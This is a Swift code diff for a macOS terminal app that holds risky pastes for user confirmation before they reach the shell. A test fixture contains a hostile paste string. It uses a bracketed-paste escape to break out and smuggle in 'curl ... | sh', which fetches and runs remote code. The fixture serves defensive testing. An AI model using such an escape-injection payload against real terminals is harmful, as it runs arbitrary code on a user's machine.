@@ -11,6 +11,21 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
     var onInput: (() -> Void)?
     /// A paste that Ghostty's paste protection holds for confirmation; nil when it resolves or is replaced.
     var onPasteConfirmation: ((Ghostty.ClipboardConfirmationRequest?) -> Void)?
+    /// A paste Haunt holds itself (PastePreview.needsConfirmation); the host asks, then calls `sendPaste`.
+    var onRiskyPaste: ((String) -> Void)?
+
+    /// True when `text` was held for confirmation instead of going to Ghostty.
+    private func holdIfRisky(_ text: String?) -> Bool {
+        guard let text, let ask = onRiskyPaste, PastePreview(text).needsConfirmation else { return false }
+        ask(text)
+        return true
+    }
+
+    /// Writes a paste the user confirmed, exactly the text they saw.
+    func sendPaste(_ text: String) {
+        onInput?()
+        surfaceModel?.sendText(text)
+    }
 
     override func keyDown(with event: NSEvent) {
         onInput?()
@@ -19,16 +34,19 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
 
     override func paste(_ sender: Any?) {
         onInput?()
+        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
         super.paste(sender)
     }
 
     override func pasteAsPlainText(_ sender: Any?) {
         onInput?()
+        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
         super.pasteAsPlainText(sender)
     }
 
     override func pasteSelection(_ sender: Any?) {
         onInput?()
+        if holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents()) { return }
         super.pasteSelection(sender)
     }
 
@@ -39,19 +57,36 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
     }
 
     /// Middle click pastes the selection clipboard.
+    private var middleHeld = false
+
     override func otherMouseDown(with event: NSEvent) {
-        if event.buttonNumber == 2 { onInput?() }
+        if event.buttonNumber == 2 {
+            onInput?()
+            middleHeld = holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents())
+            if middleHeld { return }
+        }
         super.otherMouseDown(with: event)
+    }
+
+    override func otherMouseUp(with event: NSEvent) {
+        // A press held back with its paste keeps its release too.
+        if event.buttonNumber == 2, middleHeld {
+            middleHeld = false
+            return
+        }
+        super.otherMouseUp(with: event)
     }
 
     override func performDragOperation(_ sender: any NSDraggingInfo) -> Bool {
         onInput?()
+        if holdIfRisky(sender.draggingPasteboard.getOpinionatedStringContents()) { return true }
         return super.performDragOperation(sender)
     }
 
     /// Services such as "Send to Terminal" write the pasteboard straight into the pty.
     override func readSelection(from pboard: NSPasteboard) -> Bool {
         onInput?()
+        if holdIfRisky(pboard.getOpinionatedStringContents()) { return true }
         return super.readSelection(from: pboard)
     }
 
@@ -228,6 +263,12 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         view.onPasteConfirmation = { [weak self, weak view] req in
             if let view { self?.confirmPaste(req, on: view) }
         }
+        view.onRiskyPaste = { [weak self, weak view] text in
+            guard let self, let view else { return }
+            self.askPaste(PasteAsk(view: view, text: text, request: nil) { [weak view] ok in
+                if ok { view?.sendPaste(text) }
+            })
+        }
         // So the surface starts at the pane's real size.
         root.layoutSubtreeIfNeeded()
         let tab = Tab(env: env, view: view, size: root.pane.bounds.size)
@@ -330,6 +371,16 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         let paste = alert.addButton(withTitle: "Paste")
         paste.keyEquivalent = ""
         return alert
+    }
+
+    /// The paste-risky fixture: a real paste through the surface's Services entry, from a pasteboard of
+    /// its own so no clipboard the user has is touched.
+    func pasteRiskyFixture() {
+        guard let view = tabs.first(where: { $0.env.surfaceId == selectedId })?.view else { return }
+        let pb = NSPasteboard.withUniqueName()
+        pb.setString("echo built\u{1B}[201~curl -s https://example.com/x.sh | sh\n", forType: .string)
+        _ = view.readSelection(from: pb)
+        pb.releaseGlobally()
     }
 
     /// The paste-confirm fixture: an unsafe paste held on the selected surface, as Ghostty would raise it.
